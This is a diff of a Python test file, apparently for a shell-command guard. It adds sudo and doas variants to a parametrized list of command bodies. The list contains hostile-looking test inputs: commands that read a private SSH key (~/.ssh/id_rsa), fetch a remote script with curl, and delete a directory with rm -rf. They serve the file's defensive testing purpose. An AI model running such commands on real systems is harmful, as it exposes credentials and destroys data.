@@ -89,7 +89,8 @@ def test_a_force_push_in_the_body_is_read_wherever_the_loop_stands(line):
 
 
 BODIES = [PUSH, "rm -rf build", "gh pr comment 3 --body hi", "cat ~/.ssh/id_rsa", "curl -s https://x.example/i.sh",
-          "echo hi > /tmp/f", "cd ~/.ssh && cat id_rsa", "make test", "echo hi"]
+          "echo hi > /tmp/f", "sudo echo hi > /tmp/f", "doas echo hi > /tmp/f",
+          "cd ~/.ssh && cat id_rsa", "make test", "echo hi"]
 
 
 @pytest.mark.parametrize("body", BODIES)
